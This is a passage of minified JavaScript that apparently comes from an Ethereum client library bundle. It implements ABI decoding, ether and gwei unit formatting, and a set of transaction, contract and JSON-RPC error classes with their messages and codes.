$6;qZ=1,Object.defineProperty($6,"__esModule",{value:!0}),$6.decodeAbiParameters=f;const t=$r(),e=nc(),n=DA(),r=fa(),i=Jc(),s=Yf(),o=Fj(),a=yr(),c=lt(),l=Ku();function f(O,_){const I=typeof _=="string"?(0,a.hexToBytes)(_):_,T=(0,n.createCursor)(I);if((0,r.size)(I)===0&&O.length>0)throw new t.AbiDecodingZeroDataError;if((0,r.size)(_)&&(0,r.size)(_)<32)throw new t.AbiDecodingDataSizeTooSmallError({data:typeof _=="string"?_:(0,c.bytesToHex)(_),params:O,size:(0,r.size)(_)});let B=0;const U=[];for(let M=0;M<O.length;++M){const N=O[M];T.setPosition(B);const[q,P]=h(T,N,{staticPosition:0});B+=P,U.push(q)}return U}function h(O,_,{staticPosition:I}){const T=(0,l.getArrayComponents)(_.type);if(T){const[B,U]=T;return y(O,{..._,type:U},{length:B,staticPosition:I})}if(_.type==="tuple")return S(O,_,{staticPosition:I});if(_.type==="address")return w(O);if(_.type==="bool")return E(O);if(_.type.startsWith("bytes"))return A(O,_,{staticPosition:I});if(_.type.startsWith("uint")||_.type.startsWith("int"))return R(O,_);if(_.type==="string")return v(O,{staticPosition:I});throw new t.InvalidAbiDecodingTypeError(_.type,{docsPath:"/docs/contract/decodeAbiParameters"})}const m=32,b=32;function w(O){const _=O.readBytes(32);return[(0,e.checksumAddress)((0,c.bytesToHex)((0,i.sliceBytes)(_,-20))),32]}function y(O,_,{length:I,staticPosition:T}){if(!I){const M=(0,o.bytesToNumber)(O.readBytes(b)),N=T+M,q=N+m;O.setPosition(N);const P=(0,o.bytesToNumber)(O.readBytes(m)),C=k(_);let j=0;const z=[];for(let $=0;$<P;++$){O.setPosition(q+(C?$*32:j));const[H,L]=h(O,_,{staticPosition:q});j+=L,z.push(H)}return O.setPosition(T+32),[z,32]}if(k(_)){const M=(0,o.bytesToNumber)(O.readBytes(b)),N=T+M,q=[];for(let P=0;P<I;++P){O.setPosition(N+P*32);const[C]=h(O,_,{staticPosition:N});q.push(C)}return O.setPosition(T+32),[q,32]}let B=0;const U=[];for(let M=0;M<I;++M){const[N,q]=h(O,_,{staticPosition:T+B});B+=q,U.push(N)}return[U,B]}function E(O){return[(0,o.bytesToBool)(O.readBytes(32),{size:32}),32]}function A(O,_,{staticPosition:I}){const[T,B]=_.type.split("bytes");if(!B){const M=(0,o.bytesToNumber)(O.readBytes(32));O.setPosition(I+M);const N=(0,o.bytesToNumber)(O.readBytes(32));if(N===0)return O.setPosition(I+32),["0x",32];const q=O.readBytes(N);return O.setPosition(I+32),[(0,c.bytesToHex)(q),32]}return[(0,c.bytesToHex)(O.readBytes(Number.parseInt(B,10),32)),32]}function R(O,_){const I=_.type.startsWith("int"),T=Number.parseInt(_.type.split("int")[1]||"256",10),B=O.readBytes(32);return[T>48?(0,o.bytesToBigInt)(B,{signed:I}):(0,o.bytesToNumber)(B,{signed:I}),32]}function S(O,_,{staticPosition:I}){const T=_.components.length===0||_.components.some(({name:M})=>!M),B=T?[]:{};let U=0;if(k(_)){const M=(0,o.bytesToNumber)(O.readBytes(b)),N=I+M;for(let q=0;q<_.components.length;++q){const P=_.components[q];O.setPosition(N+U);const[C,j]=h(O,P,{staticPosition:N});U+=j,B[T?q:P?.name]=C}return O.setPosition(I+32),[B,32]}for(let M=0;M<_.components.length;++M){const N=_.components[M],[q,P]=h(O,N,{staticPosition:I});B[T?M:N?.name]=q,U+=P}return[B,U]}function v(O,{staticPosition:_}){const I=(0,o.bytesToNumber)(O.readBytes(32)),T=_+I;O.setPosition(T);const B=(0,o.bytesToNumber)(O.readBytes(32));if(B===0)return O.setPosition(_+32),["",32];const U=O.readBytes(B,32),M=(0,o.bytesToString)((0,s.trim)(U));return O.setPosition(_+32),[M,32]}function k(O){const{type:_}=O;if(_==="string"||_==="bytes"||_.endsWith("[]"))return!0;if(_==="tuple")return O.components?.some(k);const I=(0,l.getArrayComponents)(O.type);return!!(I&&k({...O,type:I[1]}))}return $6}var VZ;function $8(){if(VZ)return F6;VZ=1,Object.defineProperty(F6,"__esModule",{value:!0}),F6.decodeErrorResult=o;const t=Lj(),e=$r(),n=Jc(),r=sy(),i=s0(),s=Zf();function o(a){const{abi:c,data:l}=a,f=(0,n.slice)(l,0,4);if(f==="0x")throw new e.AbiDecodingZeroDataError;const m=[...c||[],t.solidityError,t.solidityPanic].find(b=>b.type==="error"&&f===(0,r.toFunctionSelector)((0,s.formatAbiItem)(b)));if(!m)throw new e.AbiErrorSignatureNotFoundError(f,{docsPath:"/docs/contract/decodeErrorResult"});return{abiItem:m,args:"inputs"in m&&m.inputs&&m.inputs.length>0?(0,i.decodeAbiParameters)(m.inputs,(0,n.slice)(l,4)):void 0,errorName:m.name}}return F6}var z6={},h2={},WZ;function Ns(){if(WZ)return h2;WZ=1,Object.defineProperty(h2,"__esModule",{value:!0}),h2.stringify=void 0;const t=(e,n,r)=>JSON.stringify(e,(i,s)=>{const o=typeof s=="bigint"?s.toString():s;return typeof n=="function"?n(i,o):o},r);return h2.stringify=t,h2}var GZ;function dle(){if(GZ)return z6;GZ=1,Object.defineProperty(z6,"__esModule",{value:!0}),z6.formatAbiItemWithArgs=e;const t=Ns();function e({abiItem:n,args:r,includeFunctionName:i=!0,includeName:s=!1}){if("name"in n&&"inputs"in n&&n.inputs)return`${i?n.name:""}(${n.inputs.map((o,a)=>`${s&&o.name?`${o.name}: `:""}${typeof r[a]=="object"?(0,t.stringify)(r[a]):r[a]}`).join(", ")})`}return z6}var q6={},Xd={},KZ;function BA(){return KZ||(KZ=1,Object.defineProperty(Xd,"__esModule",{value:!0}),Xd.weiUnits=Xd.gweiUnits=Xd.etherUnits=void 0,Xd.etherUnits={gwei:9,wei:18},Xd.gweiUnits={ether:-9,wei:9},Xd.weiUnits={ether:-18,gwei:-9}),Xd}var V6={},ZZ;function H8(){if(ZZ)return V6;ZZ=1,Object.defineProperty(V6,"__esModule",{value:!0}),V6.formatUnits=t;function t(e,n){let r=e.toString();const i=r.startsWith("-");i&&(r=r.slice(1)),r=r.padStart(n,"0");let[s,o]=[r.slice(0,r.length-n),r.slice(r.length-n)];return o=o.replace(/(0+)$/,""),`${i?"-":""}${s||"0"}${o?`.${o}`:""}`}return V6}var YZ;function jA(){if(YZ)return q6;YZ=1,Object.defineProperty(q6,"__esModule",{value:!0}),q6.formatEther=n;const t=BA(),e=H8();function n(r,i="wei"){return(0,e.formatUnits)(r,t.etherUnits[i])}return q6}var W6={},QZ;function ay(){if(QZ)return W6;QZ=1,Object.defineProperty(W6,"__esModule",{value:!0}),W6.formatGwei=n;const t=BA(),e=H8();function n(r,i="wei"){return(0,e.formatUnits)(r,t.gweiUnits[i])}return W6}var ef={},JZ;function $j(){if(JZ)return ef;JZ=1,Object.defineProperty(ef,"__esModule",{value:!0}),ef.StateAssignmentConflictError=ef.AccountStateConflictError=void 0,ef.prettyStateMapping=r,ef.prettyStateOverride=i;const t=Kt();class e extends t.BaseError{constructor({address:o}){super(`State for account "${o}" is set multiple times.`,{name:"AccountStateConflictError"})}}ef.AccountStateConflictError=e;class n extends t.BaseError{constructor(){super("state and stateDiff are set on the same account.",{name:"StateAssignmentConflictError"})}}ef.StateAssignmentConflictError=n;function r(s){return s.reduce((o,{slot:a,value:c})=>`${o}        ${a}: ${c}
`,"")}function i(s){return s.reduce((o,{address:a,...c})=>{let l=`${o}    ${a}:
`;return c.nonce&&(l+=`      nonce: ${c.nonce}
`),c.balance&&(l+=`      balance: ${c.balance}
`),c.code&&(l+=`      code: ${c.code}
`),c.state&&(l+=`      state:
`,l+=r(c.state)),c.stateDiff&&(l+=`      stateDiff:
`,l+=r(c.stateDiff)),l},`  State Override:
`).slice(0,-1)}return ef}var _r={},XZ;function ga(){if(XZ)return _r;XZ=1,Object.defineProperty(_r,"__esModule",{value:!0}),_r.WaitForTransactionReceiptTimeoutError=_r.TransactionReceiptRevertedError=_r.TransactionReceiptNotFoundError=_r.TransactionNotFoundError=_r.TransactionExecutionError=_r.InvalidStorageKeySizeError=_r.InvalidSerializedTransactionError=_r.InvalidSerializedTransactionTypeError=_r.InvalidSerializableTransactionError=_r.InvalidLegacyVError=_r.FeeConflictError=void 0,_r.prettyPrint=r;const t=jA(),e=ay(),n=Kt();function r(y){const E=Object.entries(y).map(([R,S])=>S===void 0||S===!1?null:[R,S]).filter(Boolean),A=E.reduce((R,[S])=>Math.max(R,S.length),0);return E.map(([R,S])=>`  ${`${R}:`.padEnd(A+1)}  ${S}`).join(`
`)}class i extends n.BaseError{constructor(){super(["Cannot specify both a `gasPrice` and a `maxFeePerGas`/`maxPriorityFeePerGas`.","Use `maxFeePerGas`/`maxPriorityFeePerGas` for EIP-1559 compatible networks, and `gasPrice` for others."].join(`
`),{name:"FeeConflictError"})}}_r.FeeConflictError=i;class s extends n.BaseError{constructor({v:E}){super(`Invalid \`v\` value "${E}". Expected 27 or 28.`,{name:"InvalidLegacyVError"})}}_r.InvalidLegacyVError=s;class o extends n.BaseError{constructor({transaction:E}){super("Cannot infer a transaction type from provided transaction.",{metaMessages:["Provided Transaction:","{",r(E),"}","","To infer the type, either provide:","- a `type` to the Transaction, or","- an EIP-1559 Transaction with `maxFeePerGas`, or","- an EIP-2930 Transaction with `gasPrice` & `accessList`, or","- an EIP-4844 Transaction with `blobs`, `blobVersionedHashes`, `sidecars`, or","- an EIP-7702 Transaction with `authorizationList`, or","- a Legacy Transaction with `gasPrice`"],name:"InvalidSerializableTransactionError"})}}_r.InvalidSerializableTransactionError=o;class a extends n.BaseError{constructor({serializedType:E}){super(`Serialized transaction type "${E}" is invalid.`,{name:"InvalidSerializedTransactionType"}),Object.defineProperty(this,"serializedType",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.serializedType=E}}_r.InvalidSerializedTransactionTypeError=a;class c extends n.BaseError{constructor({attributes:E,serializedTransaction:A,type:R}){const S=Object.entries(E).map(([v,k])=>typeof k>"u"?v:void 0).filter(Boolean);super(`Invalid serialized transaction of type "${R}" was provided.`,{metaMessages:[`Serialized Transaction: "${A}"`,S.length>0?`Missing Attributes: ${S.join(", ")}`:""].filter(Boolean),name:"InvalidSerializedTransactionError"}),Object.defineProperty(this,"serializedTransaction",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"type",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.serializedTransaction=A,this.type=R}}_r.InvalidSerializedTransactionError=c;class l extends n.BaseError{constructor({storageKey:E}){super(`Size for storage key "${E}" is invalid. Expected 32 bytes. Got ${Math.floor((E.length-2)/2)} bytes.`,{name:"InvalidStorageKeySizeError"})}}_r.InvalidStorageKeySizeError=l;class f extends n.BaseError{constructor(E,{account:A,docsPath:R,chain:S,data:v,gas:k,gasPrice:O,maxFeePerGas:_,maxPriorityFeePerGas:I,nonce:T,to:B,value:U}){const M=r({chain:S&&`${S?.name} (id: ${S?.id})`,from:A?.address,to:B,value:typeof U<"u"&&`${(0,t.formatEther)(U)} ${S?.nativeCurrency?.symbol||"ETH"}`,data:v,gas:k,gasPrice:typeof O<"u"&&`${(0,e.formatGwei)(O)} gwei`,maxFeePerGas:typeof _<"u"&&`${(0,e.formatGwei)(_)} gwei`,maxPriorityFeePerGas:typeof I<"u"&&`${(0,e.formatGwei)(I)} gwei`,nonce:T});super(E.shortMessage,{cause:E,docsPath:R,metaMessages:[...E.metaMessages?[...E.metaMessages," "]:[],"Request Arguments:",M].filter(Boolean),name:"TransactionExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=E}}_r.TransactionExecutionError=f;class h extends n.BaseError{constructor({blockHash:E,blockNumber:A,blockTag:R,hash:S,index:v}){let k="Transaction";R&&v!==void 0&&(k=`Transaction at block time "${R}" at index "${v}"`),E&&v!==void 0&&(k=`Transaction at block hash "${E}" at index "${v}"`),A&&v!==void 0&&(k=`Transaction at block number "${A}" at index "${v}"`),S&&(k=`Transaction with hash "${S}"`),super(`${k} could not be found.`,{name:"TransactionNotFoundError"})}}_r.TransactionNotFoundError=h;class m extends n.BaseError{constructor({hash:E}){super(`Transaction receipt with hash "${E}" could not be found. The Transaction may not be processed on a block yet.`,{name:"TransactionReceiptNotFoundError"})}}_r.TransactionReceiptNotFoundError=m;class b extends n.BaseError{constructor({receipt:E}){super(`Transaction with hash "${E.transactionHash}" reverted.`,{metaMessages:['The receipt marked the transaction as "reverted". This could mean that the function on the contract you are trying to call threw an error.'," ","You can attempt to extract the revert reason by:","- calling the `simulateContract` or `simulateCalls` Action with the `abi` and `functionName` of the contract","- using the `call` Action with raw `data`"],name:"TransactionReceiptRevertedError"}),Object.defineProperty(this,"receipt",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.receipt=E}}_r.TransactionReceiptRevertedError=b;class w extends n.BaseError{constructor({hash:E}){super(`Timed out while waiting for transaction with hash "${E}" to be confirmed.`,{name:"WaitForTransactionReceiptTimeoutError"})}}return _r.WaitForTransactionReceiptTimeoutError=w,_r}var um={},eY;function Hj(){if(eY)return um;eY=1,Object.defineProperty(um,"__esModule",{value:!0}),um.getUrl=um.getContractAddress=void 0;const t=n=>n;um.getContractAddress=t;const e=n=>n;return um.getUrl=e,um}var tY;function o0(){if(tY)return ao;tY=1,Object.defineProperty(ao,"__esModule",{value:!0}),ao.RawContractError=ao.CounterfactualDeploymentFailedError=ao.ContractFunctionZeroDataError=ao.ContractFunctionRevertedError=ao.ContractFunctionExecutionError=ao.CallExecutionError=void 0;const t=Qr(),e=Lj(),n=$8(),r=Zf(),i=dle(),s=Qf(),o=jA(),a=ay(),c=$r(),l=Kt(),f=$j(),h=ga(),m=Hj();class b extends l.BaseError{constructor(v,{account:k,docsPath:O,chain:_,data:I,gas:T,gasPrice:B,maxFeePerGas:U,maxPriorityFeePerGas:M,nonce:N,to:q,value:P,stateOverride:C}){const j=k?(0,t.parseAccount)(k):void 0;let z=(0,h.prettyPrint)({from:j?.address,to:q,value:typeof P<"u"&&`${(0,o.formatEther)(P)} ${_?.nativeCurrency?.symbol||"ETH"}`,data:I,gas:T,gasPrice:typeof B<"u"&&`${(0,a.formatGwei)(B)} gwei`,maxFeePerGas:typeof U<"u"&&`${(0,a.formatGwei)(U)} gwei`,maxPriorityFeePerGas:typeof M<"u"&&`${(0,a.formatGwei)(M)} gwei`,nonce:N});C&&(z+=`
${(0,f.prettyStateOverride)(C)}`),super(v.shortMessage,{cause:v,docsPath:O,metaMessages:[...v.metaMessages?[...v.metaMessages," "]:[],"Raw Call Arguments:",z].filter(Boolean),name:"CallExecutionError"}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.cause=v}}ao.CallExecutionError=b;class w extends l.BaseError{constructor(v,{abi:k,args:O,contractAddress:_,docsPath:I,functionName:T,sender:B}){const U=(0,s.getAbiItem)({abi:k,args:O,name:T}),M=U?(0,i.formatAbiItemWithArgs)({abiItem:U,args:O,includeFunctionName:!1,includeName:!1}):void 0,N=U?(0,r.formatAbiItem)(U,{includeName:!0}):void 0,q=(0,h.prettyPrint)({address:_&&(0,m.getContractAddress)(_),function:N,args:M&&M!=="()"&&`${[...Array(T?.length??0).keys()].map(()=>" ").join("")}${M}`,sender:B});super(v.shortMessage||`An unknown error occurred while executing the contract function "${T}".`,{cause:v,docsPath:I,metaMessages:[...v.metaMessages?[...v.metaMessages," "]:[],q&&"Contract Call:",q].filter(Boolean),name:"ContractFunctionExecutionError"}),Object.defineProperty(this,"abi",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"args",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"contractAddress",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"formattedArgs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"functionName",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"sender",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.abi=k,this.args=O,this.cause=v,this.contractAddress=_,this.functionName=T,this.sender=B}}ao.ContractFunctionExecutionError=w;class y extends l.BaseError{constructor({abi:v,data:k,functionName:O,message:_}){let I,T,B,U;if(k&&k!=="0x")try{T=(0,n.decodeErrorResult)({abi:v,data:k});const{abiItem:N,errorName:q,args:P}=T;if(q==="Error")U=P[0];else if(q==="Panic"){const[C]=P;U=e.panicReasons[C]}else{const C=N?(0,r.formatAbiItem)(N,{includeName:!0}):void 0,j=N&&P?(0,i.formatAbiItemWithArgs)({abiItem:N,args:P,includeFunctionName:!1,includeName:!1}):void 0;B=[C?`Error: ${C}`:"",j&&j!=="()"?`       ${[...Array(q?.length??0).keys()].map(()=>" ").join("")}${j}`:""]}}catch(N){I=N}else _&&(U=_);let M;I instanceof c.AbiErrorSignatureNotFoundError&&(M=I.signature,B=[`Unable to decode signature "${M}" as it was not found on the provided ABI.`,"Make sure you are using the correct ABI and that the error exists on it.",`You can look up the decoded signature here: https://openchain.xyz/signatures?query=${M}.`]),super(U&&U!=="execution reverted"||M?[`The contract function "${O}" reverted with the following ${M?"signature":"reason"}:`,U||M].join(`
`):`The contract function "${O}" reverted.`,{cause:I,metaMessages:B,name:"ContractFunctionRevertedError"}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"raw",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"reason",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"signature",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=T,this.raw=k,this.reason=U,this.signature=M}}ao.ContractFunctionRevertedError=y;class E extends l.BaseError{constructor({functionName:v}){super(`The contract function "${v}" returned no data ("0x").`,{metaMessages:["This could be due to any of the following:",`  - The contract does not have the function "${v}",`,"  - The parameters passed to the contract function may be invalid, or","  - The address is not a contract."],name:"ContractFunctionZeroDataError"})}}ao.ContractFunctionZeroDataError=E;class A extends l.BaseError{constructor({factory:v}){super(`Deployment for counterfactual contract call failed${v?` for factory "${v}".`:""}`,{metaMessages:["Please ensure:","- The `factory` is a valid contract deployment factory (ie. Create2 Factory, ERC-4337 Factory, etc).","- The `factoryData` is a valid encoded function call for contract deployment function on the factory."],name:"CounterfactualDeploymentFailedError"})}}ao.CounterfactualDeploymentFailedError=A;class R extends l.BaseError{constructor({data:v,message:k}){super(k||"",{name:"RawContractError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:3}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=v}}return ao.RawContractError=R,ao}var Ba={},nY;function Zu(){if(nY)return Ba;nY=1,Object.defineProperty(Ba,"__esModule",{value:!0}),Ba.TimeoutError=Ba.SocketClosedError=Ba.RpcRequestError=Ba.WebSocketRequestError=Ba.HttpRequestError=void 0;const t=Ns(),e=Kt(),n=Hj();class r extends e.BaseError{constructor({body:l,cause:f,details:h,headers:m,status:b,url:w}){super("HTTP request failed.",{cause:f,details:h,metaMessages:[b&&`Status: ${b}`,`URL: ${(0,n.getUrl)(w)}`,l&&`Request body: ${(0,t.stringify)(l)}`].filter(Boolean),name:"HttpRequestError"}),Object.defineProperty(this,"body",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"headers",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"status",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.body=l,this.headers=m,this.status=b,this.url=w}}Ba.HttpRequestError=r;class i extends e.BaseError{constructor({body:l,cause:f,details:h,url:m}){super("WebSocket request failed.",{cause:f,details:h,metaMessages:[`URL: ${(0,n.getUrl)(m)}`,l&&`Request body: ${(0,t.stringify)(l)}`].filter(Boolean),name:"WebSocketRequestError"}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.url=m}}Ba.WebSocketRequestError=i;class s extends e.BaseError{constructor({body:l,error:f,url:h}){super("RPC Request failed.",{cause:f,details:f.message,metaMessages:[`URL: ${(0,n.getUrl)(h)}`,`Request body: ${(0,t.stringify)(l)}`],name:"RpcRequestError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=f.code,this.data=f.data,this.url=h}}Ba.RpcRequestError=s;class o extends e.BaseError{constructor({url:l}={}){super("The socket has been closed.",{metaMessages:[l&&`URL: ${(0,n.getUrl)(l)}`].filter(Boolean),name:"SocketClosedError"}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.url=l}}Ba.SocketClosedError=o;class a extends e.BaseError{constructor({body:l,url:f}){super("The request took too long to respond.",{details:"The request timed out.",metaMessages:[`URL: ${(0,n.getUrl)(f)}`,`Request body: ${(0,t.stringify)(l)}`],name:"TimeoutError"}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.url=f}}return Ba.TimeoutError=a,Ba}var xt={},rY;function a0(){if(rY)return xt;rY=1,Object.defineProperty(xt,"__esModule",{value:!0}),xt.UnknownRpcError=xt.AtomicityNotSupportedError=xt.AtomicReadyWalletRejectedUpgradeError=xt.BundleTooLargeError=xt.UnknownBundleIdError=xt.DuplicateIdError=xt.UnsupportedChainIdError=xt.UnsupportedNonOptionalCapabilityError=xt.SwitchChainError=xt.ChainDisconnectedError=xt.ProviderDisconnectedError=xt.UnsupportedProviderMethodError=xt.UnauthorizedProviderError=xt.UserRejectedRequestError=xt.JsonRpcVersionUnsupportedError=xt.LimitExceededRpcError=xt.MethodNotSupportedRpcError=xt.TransactionRejectedRpcError=xt.ResourceUnavailableRpcError=xt.ResourceNotFoundRpcError=xt.InvalidInputRpcError=xt.InternalRpcError=xt.InvalidParamsRpcError=xt.MethodNotFoundRpcError=xt.InvalidRequestRpcError=xt.ParseRpcError=xt.ProviderRpcError=xt.RpcError=void 0;const t=Kt(),e=Zu(),n=-1;class r extends t.BaseError{constructor(C,{code:j,docsPath:z,metaMessages:$,name:H,shortMessage:L}){super(L,{cause:C,docsPath:z,metaMessages:$||C?.metaMessages,name:H||"RpcError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.name=H||C.name,this.code=C instanceof e.RpcRequestError?C.code:j??n}}xt.RpcError=r;class i extends r{constructor(C,j){super(C,j),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=j.data}}xt.ProviderRpcError=i;class s extends r{constructor(C){super(C,{code:s.code,name:"ParseRpcError",shortMessage:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."})}}xt.ParseRpcError=s,Object.defineProperty(s,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32700});class o extends r{constructor(C){super(C,{code:o.code,name:"InvalidRequestRpcError",shortMessage:"JSON is not a valid request object."})}}xt.InvalidRequestRpcError=o,Object.defineProperty(o,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32600});class a extends r{constructor(C,{method:j}={}){super(C,{code:a.code,name:"MethodNotFoundRpcError",shortMessage:`The method${j?` "${j}"`:""} does not exist / is not available.`})}}xt.MethodNotFoundRpcError=a,Object.defineProperty(a,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32601});class c extends r{constructor(C){super(C,{code:c.code,name:"InvalidParamsRpcError",shortMessage:["Invalid parameters were provided to the RPC method.","Double check you have provided the correct parameters."].join(`
`)})}}xt.InvalidParamsRpcError=c,Object.defineProperty(c,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32602});class l extends r{constructor(C){super(C,{code:l.code,name:"InternalRpcError",shortMessage:"An internal error was received."})}}xt.InternalRpcError=l,Object.defineProperty(l,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32603});class f extends r{constructor(C){super(C,{code:f.code,name:"InvalidInputRpcError",shortMessage:["Missing or invalid parameters.","Double check you have provided the correct parameters."].join(`
`)})}}xt.InvalidInputRpcError=f,Object.defineProperty(f,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32e3});class h extends r{constructor(C){super(C,{code:h.code,name:"ResourceNotFoundRpcError",shortMessage:"Requested resource not found."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceNotFoundRpcError"})}}xt.ResourceNotFoundRpcError=h,Object.defineProperty(h,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32001});class m extends r{constructor(C){super(C,{code:m.code,name:"ResourceUnavailableRpcError",shortMessage:"Requested resource not available."})}}xt.ResourceUnavailableRpcError=m,Object.defineProperty(m,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32002});class b extends r{constructor(C){super(C,{code:b.code,name:"TransactionRejectedRpcError",shortMessage:"Transaction creation failed."})}}xt.TransactionRejectedRpcError=b,Object.defineProperty(b,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32003});class w extends r{constructor(C,{method:j}={}){super(C,{code:w.code,name:"MethodNotSupportedRpcError",shortMessage:`Method${j?` "${j}"`:""} is not supported.`})}}xt.MethodNotSupportedRpcError=w,Object.defineProperty(w,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32004});class y extends r{constructor(C){super(C,{code:y.code,name:"LimitExceededRpcError",shortMessage:"Request exceeds defined limit."})}}xt.LimitExceededRpcError=y,Object.defineProperty(y,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32005});class E extends r{constructor(C){super(C,{code:E.code,name:"JsonRpcVersionUnsupportedError",shortMessage:"Version of JSON-RPC protocol is not supported."})}}xt.JsonRpcVersionUnsupportedError=E,Object.defineProperty(E,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32006});class A extends i{constructor(C){super(C,{code:A.code,name:"UserRejectedRequestError",shortMessage:"User rejected the request."})}}xt.UserRejectedRequestError=A,Object.defineProperty(A,"code",{enumerable:!0,configurable:!0,writable:!0,value:4001});class R extends i{constructor(C){super(C,{code:R.code,name:"UnauthorizedProviderError",shortMessage:"The requested method and/or account has not been authorized by the user."})}}xt.UnauthorizedProviderError=R,Object.defineProperty(R,"code",{enumerable:!0,configurable:!0,writable:!0,value:4100});class S extends i{constructor(C,{method:j}={}){super(C,{code:S.code,name:"UnsupportedProviderMethodError",shortMessage:`The Provider does not support the requested method${j?` " ${j}"`:""}.`})}}xt.UnsupportedProviderMethodError=S,Object.defineProperty(S,"code",{enumerable:!0,configurable:!0,writable:!0,value:4200});class v extends i{constructor(C){super(C,{code:v.code,name:"ProviderDisconnectedError",shortMessage:"The Provider is disconnected from all chains."})}}xt.ProviderDisconnectedError=v,Object.defineProperty(v,"code",{enumerable:!0,configurable:!0,writable:!0,value:4900});class k extends i{constructor(C){super(C,{code:k.code,name:"ChainDisconnectedError",shortMessage:"The Provider is not connected to the requested chain."})}}xt.ChainDisconnectedError=k,Object.defineProperty(k,"code",{enumerable:!0,configurable:!0,writable:!0,value:4901});class O extends i{constructor(C){super(C,{code:O.code,name:"SwitchChainError",shortMessage:"An error occurred when attempting to switch chain."})}}xt.SwitchChainError=O,Object.defineProperty(O,"code",{enumerable:!0,configurable:!0,writable:!0,value:4902});class _ extends i{constructor(C){super(C,{code:_.code,name:"UnsupportedNonOptionalCapabilityError",shortMessage:"This Wallet does not support a capability that was not marked as optional."})}}xt.UnsupportedNonOptionalCapabilityError=_,Object.defineProperty(_,"code",{enumerable:!0,configurable:!0,writable:!0,value:5700});class I extends i{constructor(C){super(C,{code:I.code,name:"UnsupportedChainIdError",shortMessage:"This Wallet does not support the requested chain ID."})}}xt.UnsupportedChainIdError=I,Object.defineProperty(I,"code",{enumerable:!0,configurable:!0,writable:!0,value:5710});class T extends i{constructor(C){super(C,{code:T.code,name:"DuplicateIdError",shortMessage:"There is already a bundle submitted with this ID."})}}xt.DuplicateIdError=T,Object.defineProperty(T,"code",{enumerable:!0,configurable:!0,writable:!0,value:5720});class B extends i{constructor(C){super(C,{code:B.code,name:"UnknownBundleIdError",shortMessage:"This bundle id is unknown / has not been submitted"})}}xt.UnknownBundleIdError=B,Object.defineProperty(B,"code",{enumerable:!0,configurable:!0,writable:!0,value:5730});class U extends i{constructor(C){super(C,{code:U.code,name:"BundleTooLargeError",shortMessage:"The call bundle is too large for the Wallet to process."})}}xt.BundleTooLargeError=U,Object.defineProperty(U,"code",{enumerable:!0,configurable:!0,writable:!0,value:5740});class M extends i{constructor(C){super(C,{code:M.code,name:"AtomicReadyWalletRejectedUpgradeError",shortMessage:"The Wallet can support atomicity after an upgrade, but the user rejected the upgrade."})}}xt.AtomicReadyWalletRejectedUpgradeError=M,Object.defineProperty(M,"code",{enumerable:!0,configurable:!0,writable:!0,value:5750});class N extends i{constructor(C){super(C,{code:N.code,name:"AtomicityNotSupportedError",shortMessage:"The wallet does not support atomic execution but the request requires it."})}}xt.AtomicityNotSupportedError=N,Object.defineProperty(N,"code",{enumerable:!0,configurable:!0,writable:!0,value:5760});class q extends r{constructor(C){super(C,{name:"UnknownRpcError",shortMessage:"An unknown RPC error occurred."})}}return xt.UnknownRpcError=q,xt}var iY;function c0(){if(iY)return L6;iY=1,Object.defineProperty(L6,"__esModule",{value:!0}),L6.getContractError=o;const t=$r(),e=Kt(),n=o0(),r=Zu(),i=a0(),s=3;function o(a,{abi:c,address:l,args:f,docsPath:h,functionName:m,sender:b}){const w=a instanceof n.RawContractError?a:a instanceof 